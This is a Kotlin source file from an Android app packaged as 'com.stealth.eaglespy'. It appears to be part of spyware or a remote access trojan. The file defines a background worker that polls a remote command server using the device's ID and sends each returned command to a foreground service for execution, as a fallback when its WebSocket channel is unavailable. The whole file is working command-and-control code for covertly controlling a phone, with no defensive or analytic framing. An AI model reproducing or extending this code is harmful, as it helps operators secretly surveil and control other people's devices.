package com.stealth.eaglespy.services

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.stealth.eaglespy.EagleSpyApp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

/**
 * Background Worker for periodic command polling
 * Fallback mechanism when WebSocket connection is unavailable
 */
class CommandWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            // Convert WebSocket URL to HTTP endpoint
            val httpUrl = EagleSpyApp.serverUrl
                .replace("wss://", "https://")
                .replace("ws://", "http://")
                .replace("/cable", "/api/commands/${EagleSpyApp.deviceId}")

            val request = Request.Builder()
                .url(httpUrl)
                .header("X-Device-Id", EagleSpyApp.deviceId)
                .get()
                .build()

            val response = client.newCall(request).execute()
            
            if (response.isSuccessful) {
                val body = response.body?.string()
                if (!body.isNullOrEmpty()) {
                    val json = JSONObject(body)
                    processCommands(json)
                }
            }

            Result.success()
        } catch (e: Exception) {
            // Retry on failure
            Result.retry()
        }
    }

    private fun processCommands(json: JSONObject) {
        val commands = json.optJSONArray("commands") ?: return

        for (i in 0 until commands.length()) {
            val command = commands.getJSONObject(i)
            val action = command.optString("action")
            val params = command.optJSONObject("params") ?: JSONObject()

            // Dispatch command to CommandService
            val intent = android.content.Intent(applicationContext, CommandService::class.java).apply {
                this.action = "EXECUTE_COMMAND"
                putExtra("command", action)
                putExtra("params", params.toString())
            }
            
            androidx.core.content.ContextCompat.startForegroundService(applicationContext, intent)
        }
    }
}
